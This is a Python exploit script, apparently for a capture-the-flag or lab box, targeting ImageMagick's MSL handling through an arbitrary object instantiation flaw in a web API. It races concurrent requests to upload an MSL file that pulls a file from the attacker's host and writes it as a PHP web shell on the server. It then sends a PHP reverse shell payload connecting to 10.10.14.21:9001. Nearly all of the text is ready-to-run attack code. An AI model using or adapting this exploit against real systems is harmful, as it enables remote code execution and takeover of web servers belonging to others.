#!/usr/bin/env python3

"""
author: otter ʕ •ᴥ•ʔ

based on https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/

This script uses ImageMagick's MSL format to write a file onto the target machine, in this case
it uploads a php file that can be executed to gain RCE on the host.
"""

import asyncio
import aiohttp
import requests

# declare headers and bodies for the 3 requests
# modify them based on the functionality of the website
header = {
    'Content-Type': 'application/json',
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
    'Cookie': 'token=SOMETOKEN',
    'Connection': 'close'
}

second_header = {
    "Accept": "*/*",
    "Content-Type": "multipart/form-data; boundary=------------------------ABC"
}

data = {
    'path': 'vid:msl:/tmp/php*',
    'effect': 'charcoal'
}

second_data = '''
--------------------------ABC
Content-Disposition: form-data; name="swarm"; filename="swarm.msl"
Content-Type: application/octet-stream

<?xml version="1.0" encoding="UTF-8"?>
<image>
<read filename="http://myip:myport/otter.png" />
<write filename="/var/www/html/website/otter.php" />
</image>
--------------------------ABC--
'''

third_data = {
    'path': 'vid:msl:/var/www/html/website/index*',
    'effect': 'charcoal'
}

# compose urls for different requests
base = 'http://website.com/'
url = base + "api/endpoint_name"  # vulnerable endpoint
second_url = url + "otter.php"  # shell url


async def send_requests():
    async with aiohttp.ClientSession(headers=header) as session:
        tasks = []

        # send requests with 3 concurrent tasks until they are accepted
        for _ in range(30):
            task1 = asyncio.ensure_future(session.post(url, json=data))
            tasks.append(task1)

            task2 = asyncio.ensure_future(
                session.post(url, headers=second_header, data=second_data))
            tasks.append(task2)

            task3 = asyncio.ensure_future(session.post(url, json=third_data))
            tasks.append(task3)

        responses = await asyncio.gather(*tasks)

        for response in responses:
            print(await response.text())

loop = asyncio.get_event_loop()

# send a request to the shell once the initial one is accepted
loop.run_until_complete(send_requests())
revshell = {
    "a": """$sock=fsockopen("10.10.14.21",9001);$proc=proc_open("sh", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);"""
}

requests.post(second_url, data=revshell)
